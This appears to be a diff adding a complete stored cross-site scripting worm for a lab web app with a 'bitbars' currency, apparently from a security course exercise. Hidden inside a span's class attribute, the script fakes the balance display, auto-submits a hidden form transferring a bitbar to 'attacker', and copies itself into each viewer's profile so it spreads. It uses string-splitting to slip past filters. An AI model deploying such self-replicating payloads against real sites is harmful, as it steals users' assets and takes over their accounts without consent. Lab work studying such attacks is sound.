@@ -1,0 +1,61 @@
+<span id="bitbars" class="
+  var space = String.fromCharCode(32);
+  document.getElementById('bitbar_display').innerHTML='bitbars:'+space+'10';
+
+
+  var iframe = document.createElement('iframe'); 
+  iframe.setAttribute('src', 'http://localhost:3000/transfer'); 
+  iframe.setAttribute('name', 'iframe'); 
+  iframe.setAttribute('style', 'display:none'); 
+  var f = document.createElement('form');
+  f.setAttribute('method','post');
+  f.setAttribute('action','http://localhost:3000/post_transfer?disable_fb=yes');
+  f.setAttribute('tar'+'get','iframe');
+  f.setAttribute('style', 'display:none'); 
+  var i1 = document.createElement('input');
+  i1.setAttribute('type','text');
+  i1.setAttribute('name','destination_username');
+  i1.setAttribute('value','attacker');
+  var i2 = document.createElement('input');
+  i2.setAttribute('type','text');
+  i2.setAttribute('name','quantity');
+  i2.setAttribute('value','1');
+  var s = document.createElement('input');
+  s.setAttribute('type','submit');
+  s.setAttribute('name','submit');
+  s.setAttribute('value','Transfer');
+  f.appendChild(i1);
+  f.appendChild(i2);
+  f.appendChild(s);
+  document.body.appendChild(iframe);
+  document.body.appendChild(f);
+  s.click();
+
+  var iframeP = document.createElement('iframe'); 
+  iframeP.setAttribute('src', 'http://localhost:3000/'); 
+  iframeP.setAttribute('name', 'iframeP'); 
+  iframeP.setAttribute('style', 'display:none'); 
+  var fP = document.createElement('form');
+  fP.setAttribute('method','post');
+  fP.setAttribute('action','http://localhost:3000/set_profile?disable_fb=yes');
+  fP.setAttribute('tar'+'get','iframeP');
+  fP.setAttribute('style', 'display:none'); 
+  var ta = document.createElement('textarea');
+  ta.setAttribute('name','new_profile');
+  //ta.innerHTML = 'test';
+
+  ta.innerHTML = document.getElementById('profile').innerHTML;
+  var sP = document.createElement('input'); //input element, Submit button
+  sP.setAttribute('type','submit');
+  sP.setAttribute('name','profilesubmit');
+  sP.setAttribute('value','Update Profile');
+  fP.appendChild(ta);
+  fP.appendChild(sP);
+  document.body.appendChild(iframeP);
+  document.body.appendChild(fP);
+  sP.click() || 10;
+
+
+">
+I is l33t haxx0r!
+</span>
